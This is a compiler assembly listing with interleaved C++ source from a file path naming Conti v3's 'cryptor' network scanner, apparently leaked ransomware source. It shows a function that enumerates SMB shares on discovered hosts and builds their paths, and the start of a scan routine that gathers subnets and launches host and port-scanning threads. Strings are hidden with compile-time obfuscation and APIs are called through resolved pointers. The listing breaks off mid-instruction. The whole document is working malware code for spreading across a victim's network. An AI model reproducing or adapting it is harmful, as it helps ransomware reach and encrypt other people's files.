  0014b	48 8b c8	 mov	 rcx, rax
  0014e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  00153	48 8b d0	 mov	 rdx, rax
  00156	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR TempShareInfo$7[rbp]
  0015d	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00160	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  00165	85 c0		 test	 eax, eax
  00167	0f 84 1c 01 00
	00		 je	 $LN14@EnumShares

; 252  : 
; 253  : 						plstrcpyW(ShareInfo->wszSharePath, OBFW(L"\\\\"));

  0016d	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_15LEKKCGMK@?$AA?2?$AA?2@
  00174	48 8d 8d f4 01
	00 00		 lea	 rcx, QWORD PTR $T11[rbp]
  0017b	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
  00180	48 8b c8	 mov	 rcx, rax
  00183	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0EH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<47,71,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  00188	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR ShareInfo$9[rbp]
  0018f	48 8b d0	 mov	 rdx, rax
  00192	e8 00 00 00 00	 call	 ?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z ; plstrcpyW

; 254  : 						plstrcatW(ShareInfo->wszSharePath, pwszIpAddress);

  00197	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ShareInfo$9[rbp]
  0019e	48 8b 95 a0 02
	00 00		 mov	 rdx, QWORD PTR pwszIpAddress$[rbp]
  001a5	48 8b c8	 mov	 rcx, rax
  001a8	e8 00 00 00 00	 call	 ?plstrcatW@@YAPEA_WPEA_WPEB_W@Z ; plstrcatW

; 255  : 						plstrcatW(ShareInfo->wszSharePath, OBFW(L"\\"));

  001ad	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_13FPGAJAPJ@?$AA?2@
  001b4	48 8d 8d 14 02
	00 00		 lea	 rcx, QWORD PTR $T12[rbp]
  001bb	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >
  001c0	48 8b c8	 mov	 rcx, rax
  001c3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  001c8	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR ShareInfo$9[rbp]
  001cf	48 8b d0	 mov	 rdx, rax
  001d2	e8 00 00 00 00	 call	 ?plstrcatW@@YAPEA_WPEA_WPEB_W@Z ; plstrcatW

; 256  : 						plstrcatW(ShareInfo->wszSharePath, TempShareInfo->shi1_netname);

  001d7	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ShareInfo$9[rbp]
  001de	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR TempShareInfo$7[rbp]
  001e5	48 8b 11	 mov	 rdx, QWORD PTR [rcx]
  001e8	48 8b c8	 mov	 rcx, rax
  001eb	e8 00 00 00 00	 call	 ?plstrcatW@@YAPEA_WPEA_WPEB_W@Z ; plstrcatW

; 257  : 
; 258  : 						logs::Write(OBFW(L"Found share %s."), ShareInfo->wszSharePath);

  001f0	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ShareInfo$9[rbp]
  001f7	48 89 85 68 02
	00 00		 mov	 QWORD PTR tv94[rbp], rax
  001fe	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@
  00205	48 8d 8d 38 02
	00 00		 lea	 rcx, QWORD PTR $T13[rbp]
  0020c	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >
  00211	48 8b c8	 mov	 rcx, rax
  00214	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAAPEBDXZ ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
  00219	48 8b 8d 68 02
	00 00		 mov	 rcx, QWORD PTR tv94[rbp]
  00220	48 8b d1	 mov	 rdx, rcx
  00223	48 8b c8	 mov	 rcx, rax
  00226	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write
$LN10@EnumShares:

; 259  : 						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);

  0022b	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ShareInfo$9[rbp]
  00232	48 c7 80 00 7d
	00 00 00 00 00
	00		 mov	 QWORD PTR [rax+32000], 0
  0023d	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ShareInfo$9[rbp]
  00244	48 8b 8d a8 02
	00 00		 mov	 rcx, QWORD PTR ShareList$[rbp]
  0024b	48 8b 49 08	 mov	 rcx, QWORD PTR [rcx+8]
  0024f	48 89 88 08 7d
	00 00		 mov	 QWORD PTR [rax+32008], rcx
  00256	48 8b 85 a8 02
	00 00		 mov	 rax, QWORD PTR ShareList$[rbp]
  0025d	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00261	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR ShareInfo$9[rbp]
  00268	48 89 08	 mov	 QWORD PTR [rax], rcx
  0026b	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR ShareInfo$9[rbp]
  00272	48 05 00 7d 00
	00		 add	 rax, 32000		; 00007d00H
  00278	48 8b 8d a8 02
	00 00		 mov	 rcx, QWORD PTR ShareList$[rbp]
  0027f	48 89 41 08	 mov	 QWORD PTR [rcx+8], rax
  00283	33 c0		 xor	 eax, eax
  00285	85 c0		 test	 eax, eax
  00287	75 a2		 jne	 SHORT $LN10@EnumShares
$LN14@EnumShares:
$LN12@EnumShares:

; 260  : 
; 261  : 					}
; 262  : 
; 263  : 				}
; 264  : 
; 265  : 				TempShareInfo++;

  00289	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR TempShareInfo$7[rbp]
  00290	48 83 c0 18	 add	 rax, 24
  00294	48 89 85 a8 00
	00 00		 mov	 QWORD PTR TempShareInfo$7[rbp], rax

; 266  : 
; 267  : 			}

  0029b	e9 2b fe ff ff	 jmp	 $LN5@EnumShares
$LN6@EnumShares:

; 268  : 
; 269  : 			pNetApiBufferFree(ShareInfoBuffer);

  002a0	48 8b 4d 28	 mov	 rcx, QWORD PTR ShareInfoBuffer$[rbp]
  002a4	e8 00 00 00 00	 call	 ?pNetApiBufferFree@@YAKPEAX@Z ; pNetApiBufferFree
$LN11@EnumShares:

; 270  : 		}
; 271  : 
; 272  : 	} while (Result == ERROR_MORE_DATA);

  002a9	81 7d 04 ea 00
	00 00		 cmp	 DWORD PTR Result$[rbp], 234 ; 000000eaH
  002b0	0f 84 b8 fd ff
	ff		 je	 $LN4@EnumShares

; 273  : }

  002b6	48 8d 4d c0	 lea	 rcx, QWORD PTR [rbp-64]
  002ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z$rtcFrameData
  002c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  002c6	48 8b 8d 70 02
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  002cd	48 33 cd	 xor	 rcx, rbp
  002d0	e8 00 00 00 00	 call	 __security_check_cookie
  002d5	48 8d a5 88 02
	00 00		 lea	 rsp, QWORD PTR [rbp+648]
  002dc	5f		 pop	 rdi
  002dd	5d		 pop	 rbp
  002de	c3		 ret	 0
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z ENDP ; network_scanner::EnumShares
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?StartScan@network_scanner@@YAXXZ
_TEXT	SEGMENT
WsaData$ = 16
hHostHandler$ = 456
hPortScan$ = 488
SubnetInfo$ = 520
$T4 = 936
$T5 = 1024
$T6 = 1128
$T7 = 1192
$T8 = 1272
__$ArrayPad$ = 1352
?StartScan@network_scanner@@YAXXZ PROC			; network_scanner::StartScan, COMDAT

; 624  : {

$LN25:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 88 05
	00 00		 sub	 rsp, 1416		; 00000588H
  0000a	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  0000f	48 8d 7c 24 30	 lea	 rdi, QWORD PTR [rsp+48]
  00014	b9 f6 00 00 00	 mov	 ecx, 246		; 000000f6H
  00019	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0001e	f3 ab		 rep stosd
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c5	 xor	 rax, rbp
  0002a	48 89 85 48 05
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00038	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 625  : 	WSADATA WsaData;
; 626  : 	HANDLE hHostHandler = NULL, hPortScan = NULL;

  0003d	48 c7 85 c8 01
	00 00 00 00 00
	00		 mov	 QWORD PTR hHostHandler$[rbp], 0
  00048	48 c7 85 e8 01
	00 00 00 00 00
	00		 mov	 QWORD PTR hPortScan$[rbp], 0

; 627  : 	PSUBNET_INFO SubnetInfo = NULL;

  00053	48 c7 85 08 02
	00 00 00 00 00
	00		 mov	 QWORD PTR SubnetInfo$[rbp], 0

; 628  : 
; 629  : 	g_ActiveOperations = 0;

  0005e	c7 05 00 00 00
	00 00 00 00 00	 mov	 DWORD PTR ?g_ActiveOperations@@3JA, 0 ; g_ActiveOperations

; 630  : 	pWSAStartup(MAKEWORD(2, 2), &WsaData);

  00068	48 8d 55 10	 lea	 rdx, QWORD PTR WsaData$[rbp]
  0006c	66 b9 02 02	 mov	 cx, 514			; 00000202H
  00070	e8 00 00 00 00	 call	 ?pWSAStartup@@YAHGPEAUWSAData@@@Z ; pWSAStartup

; 631  : 	pInitializeCriticalSection(&g_CriticalSection);

  00075	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  0007c	e8 00 00 00 00	 call	 ?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pInitializeCriticalSection

; 632  : 
; 633  : 	if (!GetConnectEX()) {

  00081	e8 00 00 00 00	 call	 ?GetConnectEX@@YAHXZ	; GetConnectEX
  00086	85 c0		 test	 eax, eax
  00088	75 2d		 jne	 SHORT $LN11@StartScan

; 634  : 
; 635  : 		logs::Write(OBFW(L"Can't get ConnectEx."));

  0008a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@
  00091	48 8d 8d a8 03
	00 00		 lea	 rcx, QWORD PTR $T4[rbp]
  00098	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >
  0009d	48 8b c8	 mov	 rcx, rax
  000a0	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
  000a5	48 8b c8	 mov	 rcx, rax
  000a8	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 636  : 		goto cleanup;

  000ad	e9 f7 01 00 00	 jmp	 $LN12@StartScan
  000b2	e9 f2 01 00 00	 jmp	 $cleanup$26
$LN11@StartScan:

; 637  : 
; 638  : 	}
; 639  : 
; 640  : 	GetCurrentIpAddress();

  000b7	e8 00 00 00 00	 call	 ?GetCurrentIpAddress@@YAKXZ ; GetCurrentIpAddress

; 641  : 	
; 642  : 	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);

  000bc	45 33 c9	 xor	 r9d, r9d
  000bf	45 33 c0	 xor	 r8d, r8d
  000c2	33 d2		 xor	 edx, edx
  000c4	48 c7 c1 ff ff
	ff ff		 mov	 rcx, -1
  000cb	e8 00 00 00 00	 call	 ?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z ; pCreateIoCompletionPort
  000d0	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_IocpHandle@@3PEAXEA, rax ; g_IocpHandle

; 643  : 	if (g_IocpHandle == NULL) {

  000d7	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_IocpHandle@@3PEAXEA, 0 ; g_IocpHandle
  000df	75 2d		 jne	 SHORT $LN13@StartScan

; 644  : 
; 645  : 		logs::Write(OBFW(L"Can't create io completion port."));

  000e1	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@
  000e8	48 8d 8d 00 04
	00 00		 lea	 rcx, QWORD PTR $T5[rbp]
  000ef	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
  000f4	48 8b c8	 mov	 rcx, rax
  000f7	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
  000fc	48 8b c8	 mov	 rcx, rax
  000ff	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 646  : 		goto cleanup;

  00104	e9 a0 01 00 00	 jmp	 $LN14@StartScan
  00109	e9 9b 01 00 00	 jmp	 $cleanup$26
$LN13@StartScan:
$LN4@StartScan:

; 647  : 
; 648  : 	}
; 649  : 
; 650  : 	TAILQ_INIT(&g_SubnetList);

  0010e	48 c7 05 00 00
	00 00 00 00 00
	00		 mov	 QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A, 0
  00119	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_SubnetList@@3Usubnet_list_@@A ; g_SubnetList
  00120	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A+8, rax
  00127	33 c0		 xor	 eax, eax
  00129	85 c0		 test	 eax, eax
  0012b	75 e1		 jne	 SHORT $LN4@StartScan
$LN7@StartScan:

; 651  : 	TAILQ_INIT(&g_HostList);

  0012d	48 c7 05 00 00
	00 00 00 00 00
	00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A, 0
  00138	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_HostList@@3Uhost_list_@@A ; g_HostList
  0013f	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A+8, rax
  00146	33 c0		 xor	 eax, eax
  00148	85 c0		 test	 eax, eax
  0014a	75 e1		 jne	 SHORT $LN7@StartScan
$LN10@StartScan:

; 652  : 	TAILQ_INIT(&g_ConnectionList);

  0014c	48 c7 05 00 00
	00 00 00 00 00
	00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A, 0
  00157	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_ConnectionList@@3Uconnection_list_@@A ; g_ConnectionList
  0015e	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
  00165	33 c0		 xor	 eax, eax
  00167	85 c0		 test	 eax, eax
  00169	75 e1		 jne	 SHORT $LN10@StartScan

; 653  : 
; 654  : 	if (!GetSubnets(&g_SubnetList)) {

  0016b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_SubnetList@@3Usubnet_list_@@A ; g_SubnetList
  00172	e8 00 00 00 00	 call	 ?GetSubnets@@YAHPEAUsubnet_list_@@@Z ; GetSubnets
  00177	85 c0		 test	 eax, eax
  00179	75 2d		 jne	 SHORT $LN15@StartScan

; 655  : 
; 656  : 		logs::Write(OBFW(L"Can't get subnets."));

  0017b	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@
  00182	48 8d 8d 68 04
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  00189	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >
  0018e	48 8b c8	 mov	 rcx, rax
  00191	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
  00196	48 8b c8	 mov	 rcx, rax
  00199	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 657  : 		goto cleanup;

  0019e	e9 06 01 00 00	 jmp	 $LN16@StartScan
  001a3	e9 01 01 00 00	 jmp	 $cleanup$26
$LN15@StartScan:

; 658  : 
; 659  : 	}
; 660  : 
; 661  : 	hHostHandler = pCreateThread(NULL, 0, &HostHandler, NULL, 0, NULL);

  001a8	48 c7 44 24 28
	00 00 00 00	 mov	 QWORD PTR [rsp+40], 0
  001b1	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  001b9	45 33 c9	 xor	 r9d, r9d
  001bc	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?HostHandler@@YAKPEAX@Z ; HostHandler
  001c3	33 d2		 xor	 edx, edx
  001c5	33 c9		 xor	 ecx, ecx
  001c7	e8 00 00 00 00	 call	 ?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ; pCreateThread
  001cc	48 89 85 c8 01
	00 00		 mov	 QWORD PTR hHostHandler$[rbp], rax

; 662  : 	if (hHostHandler == INVALID_HANDLE_VALUE) {

  001d3	48 83 bd c8 01
	00 00 ff	 cmp	 QWORD PTR hHostHandler$[rbp], -1
  001db	75 2d		 jne	 SHORT $LN17@StartScan

; 663  : 
; 664  : 		logs::Write(OBFW(L"Can't create host thread."));

  001dd	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@
  001e4	48 8d 8d a8 04
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  001eb	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
  001f0	48 8b c8	 mov	 rcx, rax
  001f3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
  001f8	48 8b c8	 mov	 rcx, rax
  001fb	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 665  : 		goto cleanup;

  00200	e9 a4 00 00 00	 jmp	 $LN18@StartScan
  00205	e9 9f 00 00 00	 jmp	 $cleanup$26
$LN17@StartScan:

; 666  : 
; 667  : 	}
; 668  : 
; 669  : 	hPortScan = pCreateThread(NULL, 0, &PortScanHandler, NULL, 0, NULL);

  0020a	48 c7 44 24 28
	00 00 00 00	 mov	 QWORD PTR [rsp+40], 0
  00213	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  0021b	45 33 c9	 xor	 r9d, r9d
  0021e	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?PortScanHandler@@YAKPEAX@Z ; PortScanHandler
  00225	33 d2		 xor	 edx, edx
  00227	33 c9		 xor	 ecx, ecx
  00229	e8 00 00 00 00	 call	 ?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ; pCreateThread
  0022e	48 89 85 e8 01
	00 00		 mov	 QWORD PTR hPortScan$[rbp], rax

; 670  : 	if (hPortScan == INVALID_HANDLE_VALUE) {

  00235	48 83 bd e8 01
	00 00 ff	 cmp	 QWORD PTR hPortScan$[rbp], -1
  0023d	75 27		 jne	 SHORT $LN19@StartScan

; 671  : 
; 672  : 		logs::Write(OBFW(L"Can't create port scan thread."));

  0023f	48 8d 15 00 00
